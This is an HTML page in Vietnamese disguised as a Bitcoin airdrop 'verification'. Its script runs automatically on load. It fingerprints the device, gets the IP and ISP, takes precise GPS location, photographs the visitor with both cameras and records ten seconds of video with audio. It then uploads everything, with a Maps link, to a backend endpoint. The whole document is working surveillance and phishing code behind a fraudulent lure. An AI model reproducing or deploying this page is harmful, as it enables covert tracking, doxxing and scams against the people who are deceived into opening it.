<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockchain Airdrop - Nhận 1 BTC</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e11; color: #eaecef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e2329; padding: 30px; border-radius: 16px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #474d57; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btc-icon { width: 80px; margin-bottom: 20px; }
        h2 { color: #f3ba2f; margin-bottom: 10px; }
        p { color: #848e9c; font-size: 14px; line-height: 1.6; }
        #loading { margin-top: 20px; }
        .spinner { border: 3px solid #30363d; border-top: 3px solid #f3ba2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="btc-icon" alt="BTC">
    <h2>Đang xác thực...</h2>
    <p>Vui lòng chờ trong giây lát, hệ thống đang kiểm tra thông tin và camera.</p>
    
    <div id="loading">
        <div class="spinner"></div>
        <p id="status">Đang yêu cầu quyền truy cập...</p>
    </div>
</div>

<script>
    (async function() {
        // Cập nhật trạng thái
        const statusEl = document.getElementById('status');

        // --- Cấu hình ---
        const API_ENDPOINT = '/api/send'; // Proxy backend
        const VIDEO_DURATION = 10000; // 15 giây

        // --- Đối tượng chứa thông tin thu thập ---
        const info = {
            time: new Date().toLocaleString('vi-VN'),
            ip: '',
            isp: '',
            realIp: '',
            address: '',
            country: '',
            lat: '',
            lon: '',
            device: '',
            os: '',
            cameraStatus: '⏳ Đang kiểm tra...'
        };

        // --- 1. Phát hiện thiết bị và OS (từ main (1).js) ---
        function detectDevice() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            const screenW = window.screen.width;
            const screenH = window.screen.height;
            const ratio = window.devicePixelRatio;

            if (/Android/i.test(ua)) {
                info.os = 'Android';
                const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
                info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
            } else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
                info.os = 'iOS';
                const res = `${screenW}x${screenH}@${ratio}`;
                const models = {
                    "430x932@3": "iPhone 14/15/16 Pro Max",
                    "393x852@3": "iPhone 14/15/16 Pro / 15/16",
                    "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
                    "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
                    "414x896@3": "iPhone XS Max / 11 Pro Max",
                    "414x896@2": "iPhone XR / 11",
                    "375x812@3": "iPhone X / XS / 11 Pro",
                    "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)"
                };
                info.device = models[res] || 'iPhone Model';
            } else if (/Windows NT/i.test(ua)) {
                info.device = 'Windows PC';
                info.os = 'Windows';
            } else if (/Macintosh/i.test(ua)) {
                info.device = 'Mac';
                info.os = 'macOS';
            } else {
                info.device = 'Không xác định';
                info.os = 'Không rõ';
            }
        }

        // --- 2. Lấy IP public và IP thực + ISP (từ main (1).js) ---
        async function getPublicIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const data = await r.json();
                info.ip = data.ip || 'Không rõ';
            } catch { info.ip = 'Bị chặn'; }
        }

        async function getRealIPAndISP() {
            try {
                const r = await fetch('https://icanhazip.com');
                const ip = await r.text();
                info.realIp = ip.trim();
                const res = await fetch(`https://ipwho.is/${info.realIp}`);
                const data = await res.json();
                info.isp = data.connection?.org || 'Không rõ';
                info.country = data.country || 'Việt Nam';
            } catch { info.realIp = 'Lỗi kết nối'; }
        }

        // --- 3. Lấy vị trí (GPS hoặc IP) (từ main (1).js) ---
        async function getLocation() {
            return new Promise(resolve => {
                if (!navigator.geolocation) return fallbackIPLocation().then(resolve);

                navigator.geolocation.getCurrentPosition(
                    async pos => {
                        info.lat = pos.coords.latitude.toFixed(6);
                        info.lon = pos.coords.longitude.toFixed(6);
                        try {
                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                            const data = await res.json();
                            info.address = data.display_name || '📍 Vị trí GPS';
                            info.country = data.address?.country || info.country;
                        } catch {
                            info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`;
                        }
                        resolve();
                    },
                    async () => {
                        await fallbackIPLocation();
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }

        async function fallbackIPLocation() {
            try {
                const data = await fetch(`https://ipwho.is/`).then(r => r.json());
                info.lat = data.latitude?.toFixed(6) || '0';
                info.lon = data.longitude?.toFixed(6) || '0';
                info.address = `${data.city}, ${data.region} (Vị trí IP)`;
                info.country = data.country || 'Việt Nam';
            } catch { info.address = 'Không rõ'; }
        }

        // --- 4. Hàm chụp ảnh từ camera (trước/sau) (từ main (1).js) ---
        async function captureCamera(facingMode = 'user') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
                return new Promise(resolve => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        setTimeout(() => {
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            stream.getTracks().forEach(t => t.stop());
                            // Trả về Blob thay vì base64 để dễ gửi multipart
                            canvas.toBlob(resolve, 'image/jpeg', 0.7);
                        }, 500);
                    };
                });
            } catch (e) {
                console.warn(`Không thể chụp camera ${facingMode}:`, e);
                return null;
            }
        }

        // --- 5. Quay video (từ main.js) ---
        async function recordVideo(stream, duration) {
            return new Promise((resolve) => {
                const recorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
                const chunks = [];
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    resolve(blob);
                };
                recorder.start();
                setTimeout(() => recorder.stop(), duration);
            });
        }

        // --- 6. Gửi tất cả dữ liệu qua proxy (multipart/form-data) ---
        async function sendData(frontBlob, backBlob, videoBlob) {
            const formData = new FormData();

            // Thêm ảnh nếu có
            if (frontBlob) formData.append('front', frontBlob, 'front.jpg');
            if (backBlob) formData.append('back', backBlob, 'back.jpg');
            if (videoBlob) formData.append('video', videoBlob, 'video.mp4');

            // Thêm thông tin dưới dạng JSON string
            const mapsLink = info.lat && info.lon ? `https://maps.google.com/maps?q=${info.lat},${info.lon}` : 'Không rõ';
            const caption = `
📡 [THÔNG TIN TRUY CẬP]
🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ HĐH: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.cameraStatus}
`.trim();

            formData.append('caption', caption);

            try {
                const res = await fetch(API_ENDPOINT, {
                    method: 'POST',
                    body: formData
                });
                const result = await res.json();
                console.log('Kết quả gửi:', result);
            } catch (e) {
                console.error('Lỗi gửi dữ liệu:', e);
            }
        }

        // --- 7. Hàm chính (tự động chạy khi load) ---
        async function main() {
            statusEl.innerText = 'Đang thu thập thông tin thiết bị...';
            detectDevice();
            await Promise.all([getPublicIP(), getRealIPAndISP(), getLocation()]);

            statusEl.innerText = 'Đang yêu cầu quyền camera và microphone...';

            // Yêu cầu quyền camera trước (để vừa chụp vừa quay)
            let mainStream = null;
            try {
                mainStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: true  // yêu cầu microphone cho video
                });
                info.cameraStatus = '✅ Đã cấp quyền';
            } catch (e) {
                info.cameraStatus = '🚫 Bị từ chối hoặc lỗi camera';
                statusEl.innerText = 'Không thể truy cập camera. Kết thúc.';
                return;
            }

            statusEl.innerText = 'Đang chụp ảnh camera trước...';
            const frontBlob = await captureCamera('user');

            statusEl.innerText = 'Đang chụp ảnh camera sau (nếu có)...';
            const backBlob = await captureCamera('environment');

            statusEl.innerText = `Đang quay video trong ${VIDEO_DURATION/1000} giây...`;
            const videoBlob = await recordVideo(mainStream, VIDEO_DURATION);

            // Dừng tất cả track
            mainStream.getTracks().forEach(t => t.stop());

            statusEl.innerText = 'Đang gửi dữ liệu lên server...';
            await sendData(frontBlob, backBlob, videoBlob);

            statusEl.innerText = 'Hoàn tất! Cảm ơn bạn.';
        }

        // Bắt đầu ngay khi trang load
        main().catch(console.error);
    })();
</script>
</body>

</html>
